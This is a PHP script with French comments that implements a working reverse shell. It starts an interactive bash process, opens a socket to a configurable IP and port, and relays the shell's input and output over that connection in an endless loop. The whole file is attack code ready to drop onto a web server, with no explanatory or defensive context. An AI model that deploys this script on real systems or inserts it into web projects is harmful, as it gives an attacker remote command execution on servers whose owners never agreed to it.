<?php
$ip = '192.168.0.1';  // Remplacez par l'adresse IP de votre machine
$port = 1234;        // Remplacez par le port que vous avez configuré pour écouter

// Spécifie les descripteurs pour les pipes (stdin, stdout, stderr)
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

// Ouvre un processus pour exécuter le shell bash en mode interactif
$process = proc_open("bash -i", $descriptorspec, $pipes);

// Vérifie si le processus a été correctement ouvert
if (is_resource($process)) {
    // Ouvre une connexion socket à l'IP et au port spécifiés
    $socket = fsockopen($ip, $port);
    if (!$socket) {
        die('Could not connect to server');  // Arrête le script si la connexion échoue
    }

    // Configure les streams pour qu'ils ne soient pas bloquants
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($socket, 0);

    // Boucle infinie pour transférer les données entre le shell et le socket
    while (1) {
        // Vérifie si le socket est fermé
        if (feof($socket)) {
            break;  // Quitte la boucle si le socket est fermé
        }

        // Prépare les streams à lire
        $read_a = array($socket, $pipes[1], $pipes[2]);
        // Attend que les streams soient prêts à lire
        $num_changed_streams = stream_select($read_a, $write_a = null, $error_a = null, null);

        // Si des données sont disponibles sur le socket, les lire et les envoyer au shell
        if (in_array($socket, $read_a)) {
            $input = fread($socket, 1400);
            fwrite($pipes[0], $input);
        }

        // Si des données sont disponibles sur stdout du shell, les lire et les envoyer au socket
        if (in_array($pipes[1], $read_a)) {
            $output = fread($pipes[1], 1400);
            fwrite($socket, $output);
        }

        // Si des données sont disponibles sur stderr du shell, les lire et les envoyer au socket
        if (in_array($pipes[2], $read_a)) {
            $output = fread($pipes[2], 1400);
            fwrite($socket, $output);
        }
    }

    // Ferme la connexion socket
    fclose($socket);
    // Ferme tous les pipes
    foreach ($pipes as $pipe) {
        fclose($pipe);
    }
    // Ferme le processus du shell
    proc_close($process);
}
?>